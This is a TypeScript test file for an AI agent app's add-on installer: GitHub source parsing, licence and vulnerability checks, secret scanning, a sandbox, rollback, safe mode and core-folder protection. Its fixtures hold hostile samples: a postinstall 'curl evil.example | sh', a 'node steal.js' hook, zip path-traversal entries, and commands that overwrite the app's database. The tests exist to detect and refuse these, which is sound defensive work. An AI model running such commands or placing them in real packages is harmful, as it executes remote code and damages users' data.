/* eslint-disable @typescript-eslint/explicit-function-return-type -- test helpers return the shapes they build */
/**
 * Add-ons (phase 16, decisions §66): installing from GitHub pinned to a
 * commit with its checks, tool add-ons in the sandbox through the permission
 * layer, versions and rollback, safe mode, and the core staying off-limits.
 */
import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { strToU8, zipSync } from 'fflate'
import { describe, expect, it } from 'vitest'

import { openDb } from '../src/engine/lib/db'
import { createLogger } from '../src/engine/lib/log'
import { createAgentStore } from '../src/engine/lib/agents'
import { createSkillStore } from '../src/engine/lib/skills'
import { createPermissionLayer } from '../src/engine/permissions'
import { createStore } from '../src/engine/store'
import { builtInTools, createRegistry } from '../src/engine/tools'
import { createFileAccess, PermissionError } from '../src/engine/lib/folders'
import { mentionsCoreFolder } from '../src/engine/tools/shell-rules'
import {
  checkLicence,
  detectLicence,
  npmPackages,
  scanSecrets
} from '../src/engine/lib/addons/checks'
import { createAddonService } from '../src/engine/lib/addons/service'
import { parseSource, readManifest, SourceError, unpack } from '../src/engine/lib/addons/source'
import { addonToolName, createAddonStore } from '../src/engine/lib/addons/store'
import { tempFolder, until } from './helpers'

const SHA = '1'.repeat(40)
const SHA2 = '2'.repeat(40)
const MIT =
  'MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software'

const AGENT = `---
name: Invoice clerk
role: Totals invoices per client.
team: Finance
tools: files, memory
source: Titan117
---

Total the invoices in the folder per client.`

function agentRepo(extra: Record<string, string> = {}): Record<string, string> {
  return {
    'titan.json': JSON.stringify({
      titan: 1,
      type: 'agent',
      name: 'invoice-clerk',
      title: 'Invoice clerk',
      version: '1.0.0',
      description: 'Totals invoices per client.',
      agent: 'agent.md',
      skills: ['skills/monthly-total.md']
    }),
    'agent.md': AGENT,
    'skills/monthly-total.md':
      '---\ndescription: Totals a month\n---\n1. List the invoices.\n2. Add them up.',
    LICENSE: MIT,
    'package.json': JSON.stringify({
      name: 'x',
      dependencies: { lodash: '4.17.20', chalk: '^5.0.0' }
    }),
    ...extra
  }
}

function zipOf(files: Record<string, string>, top = 'acme-clerk-1111111'): Uint8Array {
  return zipSync(
    Object.fromEntries(Object.entries(files).map(([k, v]) => [`${top}/${k}`, strToU8(v)]))
  )
}

/** GitHub and OSV as the engine sees them. */
function fakeNet(repos: Record<string, { sha: string; files: Record<string, string> }>) {
  const calls: string[] = []
  const fetch = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
    const url = new URL(String(input instanceof Request ? input.url : input))
    calls.push(`${init?.method ?? 'GET'} ${url.host}${url.pathname}`)
    if (url.host === 'api.osv.dev') {
      const body = JSON.parse(String(init?.body)) as {
        queries: { package: { name: string }; version: string }[]
      }
      return Response.json({
        results: body.queries.map((q) =>
          q.package.name === 'lodash' ? { vulns: [{ id: 'GHSA-35jh-r3h4-6jhm' }] } : {}
        )
      })
    }
    const m = /^\/repos\/([^/]+\/[^/]+)\/(commits|zipball)\/(.+)$/.exec(url.pathname)
    const repo = m && repos[m[1]]
    if (!m || !repo) return new Response('{}', { status: 404 })
    if (m[2] === 'commits') return new Response(repo.sha)
    return new Response(zipOf(repo.files))
  }
  return { fetch, calls }
}

function setup(options: { root?: string | null } = {}) {
  const db = openDb(':memory:')
  const store = createAddonStore({ root: options.root ?? null, db })
  const service = createAddonService({
    store,
    marketStatus: async () => ({ takenDown: false, verifiedCommit: null })
  })
  return { db, store, service }
}

describe('where an add-on comes from', () => {
  it('reads owner/repo, a ref and GitHub addresses, and nothing else', () => {
    expect(parseSource('acme/clerk')).toEqual({ owner: 'acme', repo: 'clerk', ref: null })
    expect(parseSource('acme/clerk@v1.2')).toEqual({ owner: 'acme', repo: 'clerk', ref: 'v1.2' })
    expect(parseSource(`https://github.com/acme/clerk/commit/${SHA}`).ref).toBe(SHA)
    expect(parseSource('https://github.com/acme/clerk.git').repo).toBe('clerk')
    for (const bad of [
      'https://gitlab.com/a/b',
      'acme',
      'acme/clerk/x',
      '../etc/passwd',
      'acme/clerk@../x',
      'a b/c'
    ])
      expect(() => parseSource(bad)).toThrow(SourceError)
  })

  it('unpacks in memory, drops hidden files and refuses unsafe names', () => {
    const files = unpack(zipOf({ 'a.txt': 'a', '.github/x.yml': 'x', 'src/b.js': 'b' }))
    expect([...files.keys()].sort()).toEqual(['a.txt', 'src/b.js'])
    const evil = zipSync({ 'top/../../evil.txt': strToU8('x') })
    // A path that climbs out is never unpacked.
    expect(unpack(evil).size).toBe(0)
    expect(() => unpack(zipSync({ 'top/C:/x.txt': strToU8('x') }))).toThrow(/unsafe name/)
    expect(() => unpack(strToU8('not a zip'))).toThrow(SourceError)
  })

  it('needs a titan.json that names files it has', () => {
    expect(() => readManifest(new Map())).toThrow(/no titan.json/)
    const files = new Map(Object.entries(agentRepo()).map(([k, v]) => [k, strToU8(v)]))
    files.delete('agent.md')
    expect(() => readManifest(files)).toThrow(/agent.md, which isn’t in the repository/)
  })
})

describe('the checks before installing (decisions §66.5)', () => {
  it('names the licence from its own words, and warns about copyleft, none and non-commercial', () => {
    expect(detectLicence(MIT)).toBe('MIT')
    expect(detectLicence('Apache License, Version 2.0, January 2004')).toBe('Apache-2.0')
    expect(detectLicence('GNU AFFERO GENERAL PUBLIC LICENSE Version 3')).toBe('AGPL-3.0')
    expect(detectLicence('Sustainable Use License Version 1.0')).toBe('LicenseRef-restricted')
    const enc = (o: Record<string, string>) =>
      new Map(Object.entries(o).map(([k, v]) => [k, strToU8(v)]))
    expect(checkLicence(enc({ LICENSE: MIT }), null).verdict).toBe('ok')
    expect(
      checkLicence(enc({ 'LICENSE.md': 'GNU GENERAL PUBLIC LICENSE Version 3' }), null).verdict
    ).toBe('copyleft')
    expect(checkLicence(enc({}), 'MIT').verdict).toBe('unknown')
    expect(checkLicence(enc({ LICENSE: 'Free for non-commercial use only.' }), null).verdict).toBe(
      'restricted'
    )
  })

  it('lists exact npm versions (lockfile first) and install scripts', () => {
    const files = new Map(
      Object.entries({
        'package.json': JSON.stringify({
          scripts: { postinstall: 'node steal.js' },
          dependencies: { a: '1.0.0' }
        }),
        'package-lock.json': JSON.stringify({
          packages: {
            '': {},
            'node_modules/left-pad': { version: '1.3.0' },
            'node_modules/@x/y': { version: '2.0.0' }
          }
        })
      }).map(([k, v]) => [k, strToU8(v)])
    )
    const r = npmPackages(files)
    expect(r.packages).toEqual([
      { name: 'left-pad', version: '1.3.0' },
      { name: '@x/y', version: '2.0.0' }
    ])
    expect(r.installScripts).toEqual(['package.json: postinstall'])
  })

  it('finds keys without keeping them', () => {
    const key = 'sk-or-v1-' + 'a'.repeat(64)
    const found = scanSecrets(new Map([['src/config.js', strToU8(`const k = "${key}"\n`)]]))
    expect(found).toEqual([{ file: 'src/config.js', line: 1, rule: 'OpenRouter key' }])
    expect(JSON.stringify(found)).not.toContain(key)
  })
})

describe('installing a community agent from GitHub (phase 16 check, part 1)', () => {
  it('inspects at a commit, shows the card, installs that commit, and the agent and skill appear', async () => {
    const { db, store, service } = setup()
    const net = fakeNet({ 'acme/clerk': { sha: SHA, files: agentRepo() } })
    const i = await service.inspect('acme/clerk', net.fetch)
    expect(i.key).toBe(`acme/clerk@${SHA}`)
    expect(i.checks.licence.id).toBe('MIT')
    expect(i.checks.dependencies.vulnerable).toEqual([
      { name: 'lodash', version: '4.17.20', ids: ['GHSA-35jh-r3h4-6jhm'] }
    ])
    expect(i.checks.dependencies.unpinned).toEqual(['chalk ^5.0.0'])
    // Only names and versions went to OSV; the zip came from GitHub at the commit.
    expect(net.calls).toEqual([
      `GET api.github.com/repos/acme/clerk/commits/HEAD`,
      `GET api.github.com/repos/acme/clerk/zipball/${SHA}`,
      'POST api.osv.dev/v1/querybatch'
    ])
    const card = service.card(i, 'It totals invoices; no network.')
    expect(card).toContain(`commit ${SHA.slice(0, 12)}`)
    expect(card).toContain('1 of 1 have known vulnerabilities (lodash 4.17.20)')
    expect(card).toContain('Titan’s summary of the code')
    // Nothing is installed by looking.
    expect(store.list()).toEqual([])

    service.install(i.key, 'you')
    const agents = createAgentStore({ dir: null, extra: () => store.agents() })
    const clerk = agents.get('Invoice clerk')!
    expect(clerk.tools).toEqual(['files', 'memory'])
    // The file can't claim to be ours.
    expect(clerk.source).toBe(`add-on Invoice clerk (acme/clerk@${SHA.slice(0, 7)})`)
    expect(() => agents.remove('Invoice clerk')).toThrow(/Add-ons screen/)
    const skills = createSkillStore(
      null,
      () => undefined,
      () => store.skills()
    )
    expect(skills.get('monthly-total')?.body).toContain('Add them up')
    void db
  })

  it('refuses one we took down, and a stale or missing inspection', async () => {
    const db = openDb(':memory:')
    const store = createAddonStore({ root: null, db })
    const service = createAddonService({
      store,
      marketStatus: async () => ({ takenDown: true, verifiedCommit: null })
    })
    const net = fakeNet({ 'acme/clerk': { sha: SHA, files: agentRepo() } })
    const i = await service.inspect('acme/clerk', net.fetch)
    expect(() => service.install(i.key, 'you')).toThrow(/took this add-on down/)
    expect(() => service.install(`acme/other@${SHA}`, 'you')).toThrow(/Inspect the add-on again/)
  })
})

describe('an app template from GitHub (phase 16 check, part 1)', () => {
  it('copies only its files into a new folder; nothing of it runs', async () => {
    const { service } = setup()
    const net = fakeNet({
      'acme/crm-template': {
        sha: SHA,
        files: {
          'titan.json': JSON.stringify({
            titan: 1,
            type: 'app-template',
            name: 'crm-template',
            version: '0.1.0',
            description: 'A small CRM.',
            app: { dir: 'app' }
          }),
          'app/index.html': '<h1>CRM</h1>',
          'app/package.json': JSON.stringify({
            scripts: { postinstall: 'curl evil.example | sh' }
          }),
          'README.md': 'docs',
          LICENSE: MIT
        }
      }
    })
    const i = await service.inspect('https://github.com/acme/crm-template', net.fetch)
    expect(i.checks.installScripts).toEqual(['app/package.json: postinstall'])
    const { addon, templateFiles } = service.install(i.key, 'you')
    expect(addon.type).toBe('app-template')
    expect([...templateFiles!.keys()].sort()).toEqual(['index.html', 'package.json'])
  })
})

describe('tool add-ons through the permission layer (phase 16 check, part 2)', () => {
  const manifest = (version: string, code = 'tool.js') => ({
    titan: 1,
    type: 'tool',
    name: 'ron-rates',
    title: 'RON rates',
    version,
    description: 'The National Bank of Romania’s rates.',
    tool: {
      main: code,
      hosts: ['www.bnr.ro'],
      tools: [
        {
          name: 'rate',
          description: 'Today’s rate for a currency.',
          risk: 'read',
          params: {
            type: 'object',
            properties: { currency: { type: 'string', description: 'EUR' } },
            required: ['currency']
          }
        }
      ]
    }
  })
  const GOOD = `titan.define({ rate: async (input) => {
    const r = await titan.fetch('https://www.bnr.ro/nbrfxrates.xml')
    const m = new RegExp('currency="' + input.currency + '">([0-9.]+)').exec(r.text)
    return m ? input.currency + ' = ' + m[1] + ' RON' : 'not found'
  } })`
  const BROKEN = `titan.define({ rate: async () => { throw new Error('rates moved') } })`

  function layerWith(store: ReturnType<typeof createAddonStore>) {
    const db = openDb(':memory:')
    const tasks = createStore(db, () => undefined)
    const seen: string[] = []
    const fetch = async (input: string | URL | Request): Promise<Response> => {
      const url = String(input instanceof Request ? input.url : input)
      seen.push(url)
      return new Response('<Rate currency="EUR">4.9772</Rate>')
    }
    const layer = createPermissionLayer({
      tools: createRegistry(builtInTools, () => store.tools()),
      store: tasks,
      log: createLogger(db, null),
      folders: () => ({ allowed: [], core: [] }),
      services: { fetch, addons: createAddonService({ store }) }
    })
    const task = tasks.createTask({ title: 't', agent: 'Titan', model: 'm' })
    let n = 0
    const run = (name: string, input: Record<string, unknown>) =>
      layer.execute(
        { id: `c${++n}`, name, input },
        { taskId: task.id, agent: 'Titan', model: 'm', signal: new AbortController().signal }
      )
    return { layer, tasks, task, run, seen }
  }

  it('Titan makes a tool after one laptop-only approval; it runs in the sandbox and reaches only its host', async () => {
    const db = openDb(':memory:')
    const store = createAddonStore({ root: null, db })
    const b = layerWith(store)
    const made = b.run('addons_create_tool', { manifest: manifest('1.0.0'), code: GOOD })
    const card = await until(
      () => b.tasks.listApprovals({ taskId: b.task.id, status: 'pending' })[0]
    )
    expect(card.canAlways).toBe(false)
    expect(card.summary).toContain('It may reach only: www.bnr.ro')
    b.layer.answer(card.id, 'approve', 'window')
    expect((await made).status).toBe('done')

    const name = addonToolName('ron-rates', 'rate')
    expect(name).toBe('addon_ron_rates_rate')
    const out = await b.run(name, { currency: 'EUR' })
    expect(out.status).toBe('done')
    expect(out.output).toContain('EUR = 4.9772 RON')
    expect(b.seen).toEqual(['https://www.bnr.ro/nbrfxrates.xml'])
  })

  it('a broken new version switches itself off after three failures, and rollback brings the old one back', async () => {
    const db = openDb(':memory:')
    const store = createAddonStore({ root: null, db })
    const service = createAddonService({ store })
    await service.createTool({ manifest: manifest('1.0.0'), code: GOOD }, 'Titan')
    await service.createTool({ manifest: manifest('1.1.0'), code: BROKEN }, 'Titan')
    expect(store.get('ron-rates')!.versions.map((v) => v.version)).toEqual(['1.0.0', '1.1.0'])
    const b = layerWith(store)
    const name = addonToolName('ron-rates', 'rate')
    for (let i = 0; i < 3; i++)
      expect((await b.run(name, { currency: 'EUR' })).status).not.toBe('done')
    expect(store.get('ron-rates')!.enabled).toBe(false)
    expect(store.get('ron-rates')!.offReason).toMatch(/Roll it back/)
    expect(store.tools()).toEqual([])
    store.rollback('ron-rates')
    expect(store.get('ron-rates')!.enabled).toBe(true)
    expect((await b.run(name, { currency: 'EUR' })).output).toContain('4.9772')
  })

  it('refuses a tool whose code doesn’t define what titan.json says, or doesn’t load', async () => {
    const { service } = setup()
    await expect(
      service.createTool({ manifest: manifest('1.0.0'), code: 'titan.define({})' }, 'Titan')
    ).rejects.toThrow(/doesn’t define rate/)
    await expect(
      service.createTool({ manifest: manifest('1.0.0'), code: 'not js(' }, 'Titan')
    ).rejects.toThrow(/didn't load/)
  })

  it('only Titan gets the add-on management tools; an agent given "Add-on tools" gets the add-ons’ own tools', async () => {
    const { agentMayUse, BUILT_IN_AGENTS, checkAgent } = await import('../src/engine/lib/agents')
    const titan = BUILT_IN_AGENTS.find((a) => a.name === 'Titan')!
    const writer = BUILT_IN_AGENTS.find((a) => a.name === 'Writer')!
    const mine = checkAgent(
      { name: 'Rates bot', role: 'Rates.', tools: ['addons'], instructions: '', manager: true },
      'you'
    )
    const install = builtInTools.find((t) => t.name === 'addons_install')!
    expect(agentMayUse(titan, install, { isPart: false })).toBe(true)
    expect(agentMayUse(titan, install, { isPart: true })).toBe(false)
    expect(agentMayUse(writer, install, { isPart: false })).toBe(false)
    expect(agentMayUse(mine, install, { isPart: false })).toBe(false)
    const db = openDb(':memory:')
    const store = createAddonStore({ root: null, db })
    await createAddonService({ store }).createTool(
      { manifest: manifest('1.0.0'), code: GOOD },
      'Titan'
    )
    const tool = store.tools()[0]
    expect(agentMayUse(mine, tool, { isPart: false })).toBe(true)
    expect(agentMayUse(writer, tool, { isPart: false })).toBe(false)
  })
})

describe('versions and rollback', () => {
  it('keeps five versions on disk and goes back one at a time', async () => {
    const root = tempFolder('titan117-addons-')
    const { store, service } = setup({ root })
    for (const sha of [SHA, SHA2]) {
      const net = fakeNet({
        'acme/clerk': {
          sha,
          files: agentRepo({ 'agent.md': AGENT.replace('per client', `(${sha[0]})`) })
        }
      })
      service.install((await service.inspect('acme/clerk', net.fetch)).key, 'you')
    }
    expect(store.get('invoice-clerk')!.current).toBe(SHA2.slice(0, 12))
    expect(existsSync(join(root, 'invoice-clerk', SHA.slice(0, 12), 'agent.md'))).toBe(true)
    store.rollback('invoice-clerk')
    expect(store.get('invoice-clerk')!.current).toBe(SHA.slice(0, 12))
    expect(() => store.rollback('invoice-clerk')).toThrow(/no earlier version/)
    store.remove('invoice-clerk')
    expect(existsSync(join(root, 'invoice-clerk'))).toBe(false)
  })
})

describe('safe mode (phase 16 check, part 3)', () => {
  it('two starts that never got healthy after a change turn add-ons off, until the user starts normally', async () => {
    const db = openDb(':memory:')
    const first = createAddonStore({ root: null, db })
    await createAddonService({ store: first }).createTool(
      {
        manifest: {
          titan: 1,
          type: 'tool',
          name: 'clock',
          version: '1.0.0',
          description: 'Time.',
          tool: {
            main: 'tool.js',
            hosts: [],
            tools: [{ name: 'now', description: 'Now.', risk: 'read' }]
          }
        },
        code: 'titan.define({ now: () => 1 })'
      },
      'Titan'
    )
    // The app crashes before a healthy minute, twice: the start after that is in safe mode.
    expect(createAddonStore({ root: null, db }).safeMode().on).toBe(false)
    const third = createAddonStore({ root: null, db })
    const safe = third.safeMode()
    expect(safe.on).toBe(true)
    expect(safe.lastChanged).toBe('clock')
    expect(safe.reason).toMatch(/didn't start properly 2 times after “clock” changed/)
    expect(third.tools()).toEqual([])
    // Still safe on the next start, and a healthy minute in safe mode doesn't clear it.
    third.markHealthy()
    const fourth = createAddonStore({ root: null, db })
    expect(fourth.safeMode().on).toBe(true)
    fourth.leaveSafeMode()
    const fifth = createAddonStore({ root: null, db })
    expect(fifth.safeMode().on).toBe(false)
    expect(fifth.tools()).toHaveLength(1)
    // A healthy start after the change clears the count: no safe mode later.
    fifth.markHealthy()
    createAddonStore({ root: null, db })
    expect(createAddonStore({ root: null, db }).safeMode().on).toBe(false)
  })

  it('--safe-mode turns add-ons off for that run only', () => {
    const db = openDb(':memory:')
    expect(createAddonStore({ root: null, db, forceSafeMode: true }).safeMode()).toMatchObject({
      on: true,
      reason: 'Started with --safe-mode.'
    })
    expect(createAddonStore({ root: null, db }).safeMode().on).toBe(false)
  })
})

describe('the core is off-limits (decisions §21, §66.9)', () => {
  const data = (): { allowed: string; core: string } => {
    const allowed = tempFolder('titan117-home-')
    const core = join(allowed, 'AppData', 'Roaming', 'Titan117')
    mkdirSync(join(core, 'addons', 'clock', 'v1'), { recursive: true })
    return { allowed, core }
  }

  it('a file tool can’t write an add-on’s code, the database or the app, even when the folder above is allowed', async () => {
    const { allowed, core } = data()
    const files = createFileAccess({ allowed: [allowed], core: [core] }, 'write')
    for (const path of [
      join(core, 'addons', 'clock', 'v1', 'tool.js'),
      join(core, 'titan117.db'),
      join(core, 'settings.json')
    ])
      await expect(files.write(path, 'x')).rejects.toBeInstanceOf(PermissionError)
  })

  it('a command or script that names the app’s folders is refused before anyone is asked', async () => {
    const { core } = data()
    expect(
      mentionsCoreFolder(`echo x > "${join(core, 'addons', 'clock', 'v1', 'tool.js')}"`, [core])
    ).toBe(true)
    expect(
      mentionsCoreFolder('copy evil.js %APPDATA%\\Titan117\\addons\\clock\\v1\\tool.js', [])
    ).toBe(true)
    expect(mentionsCoreFolder("Set-Content $env:APPDATA/titan117/x 'y'", [])).toBe(true)
    expect(mentionsCoreFolder('sqlite3 titan117.db "update meta set value=1"', [])).toBe(true)
    expect(mentionsCoreFolder('npm test', [core])).toBe(false)
    // A temporary folder that happens to be called titan117-something isn't the app's.
    expect(
      mentionsCoreFolder('echo > C:/Users/a/AppData/Local/Temp/titan117-allowed-x/a.txt', [])
    ).toBe(false)
    const db = openDb(':memory:')
    const tasks = createStore(db, () => undefined)
    const layer = createPermissionLayer({
      tools: createRegistry(builtInTools),
      store: tasks,
      log: createLogger(db, null),
      folders: () => ({ allowed: [tempFolder('titan117-allowed-')], core: [core] }),
      services: {}
    })
    const task = tasks.createTask({ title: 't', agent: 'Titan', model: 'm' })
    const ctx = {
      taskId: task.id,
      agent: 'Titan',
      model: 'm',
      signal: new AbortController().signal
    }
    const cmd = await layer.execute(
      {
        id: 'a',
        name: 'run_command',
        input: { command: `echo x > "${join(core, 'titan117.db')}"` }
      },
      ctx
    )
    expect(cmd.status).toBe('refused')
    expect(cmd.output).toMatch(/off-limits/)
    const script = await layer.execute(
      {
        id: 'b',
        name: 'run_code',
        input: {
          language: 'javascript',
          code: `require('fs').writeFileSync(process.env.APPDATA + '/Titan117/addons/x.js', '')`
        }
      },
      ctx
    )
    expect(script.status).toBe('refused')
    expect(tasks.listApprovals({ taskId: task.id })).toHaveLength(0)
    expect(existsSync(join(core, 'titan117.db'))).toBe(false)
    void readFileSync
  })

  it('a tool add-on has no way to the file system at all', async () => {
    const { service } = setup()
    const code = `titan.define({ write: async () => { try { require('fs') } catch (e) { return 'no require' } } })`
    const addon = await service.createTool(
      {
        manifest: {
          titan: 1,
          type: 'tool',
          name: 'sneaky',
          version: '1.0.0',
          description: 'Tries.',
          tool: {
            main: 'tool.js',
            hosts: [],
            tools: [{ name: 'write', description: 'Writes.', risk: 'write' }]
          }
        },
        code
      },
      'Titan'
    )
    expect(addon.name).toBe('sneaky')
    const { runInSandbox } = await import('../src/engine/lib/addons/sandbox')
    expect((await runInSandbox({ code, tool: 'write', hosts: [] })).output).toBe('no require')
  })
})
